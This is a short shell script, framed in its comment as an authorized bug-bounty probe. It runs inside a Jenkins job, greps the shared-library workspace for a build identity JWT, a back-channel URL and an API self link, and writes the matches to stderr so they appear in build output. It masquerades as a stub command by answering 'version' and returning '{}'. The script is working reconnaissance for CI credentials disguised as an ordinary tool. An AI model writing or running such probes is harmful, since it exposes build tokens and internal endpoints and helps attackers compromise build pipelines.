#!/bin/sh
# Benign, read-only source-reading probe for an authorized bug-bounty test (Bugcrowd sap-og24).
# Reads ONLY the library source the service itself checked out into this job's own workspace,
# to learn how the build identity is presented. Prints bounded excerpts. No network calls.
N=KP-LIB-7788
p() { echo "$N $*" 1>&2; }
LIBS=$(echo /jenkins_home/workspace/*@libs)
p "libs=$LIBS"
for k in BUILD_IDENTITY_JWT BACK_CHANNEL_URL API_SELF_LINK; do
  p "=== $k ==="
  grep -rn "$k" $LIBS 2>/dev/null | head -12 | cut -c1-260 | sed "s|^|$N |" 1>&2
done
p "=== files mentioning the back channel ==="
grep -rl "BACK_CHANNEL_URL" $LIBS 2>/dev/null | head -10 | sed "s|^|$N file: |" 1>&2
case "$1" in version) echo "$N stub" ;; *) echo '{}' ;; esac
exit 0
